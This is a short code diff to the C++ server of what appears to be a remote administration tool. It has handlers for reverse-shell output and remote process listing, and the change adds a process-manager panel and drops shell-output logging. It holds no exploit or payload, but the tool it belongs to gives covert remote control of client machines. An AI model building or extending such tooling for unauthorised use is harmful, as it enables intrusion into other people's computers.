@@ -4,6 +4,7 @@
 #include "misc.hpp"
 #include "frame_client.hpp"
 #include "panel_file_manager.hpp"
+#include "panel_process_manager.hpp"
 #include "file_editor.hpp"
 
 //Definir el servidor globalmente
@@ -57,6 +58,7 @@ void Cliente_Handler::Spawn_Handler(){
         }
 
         vcDatos = strSplit(std::string(cBuffer), '\\', 5);
+
         //Pquete inicial
         if (vcDatos[0] == "01") {
             if (vcDatos.size() < 4) {
@@ -92,7 +94,6 @@ void Cliente_Handler::Spawn_Handler(){
             int iCmdH = (std::to_string(EnumComandos::Reverse_Shell_Salida).size() + 1);
             char* pBuf = cBuffer + iCmdH;
             this->EscribirSalidShell(std::string(pBuf));
-            this->Log(pBuf);
             continue;
         }
 
@@ -214,7 +215,10 @@ void Cliente_Handler::Spawn_Handler(){
 
         //Lista de procesos
         if (vcDatos[0] == std::to_string(EnumComandos::PM_Lista)) {
-            std::cout << vcDatos[1] << std::endl;
+            panelProcessManager* panel_proc = (panelProcessManager*)wxWindow::FindWindowById(EnumIDS::ID_PM_Panel, this->n_Frame);
+            if (panel_proc) {
+                panel_proc->listManager->AgregarData(vcDatos[1], this->p_Cliente._strPID);
+            }
             continue;
         }
     }
@@ -506,7 +510,6 @@ void Servidor::m_Ping(){
         lock2.unlock(); //desbloquear vector
     }
 }
-
 
 void Servidor::m_MonitorTransferencias() {
     while (this->p_Transferencias) {
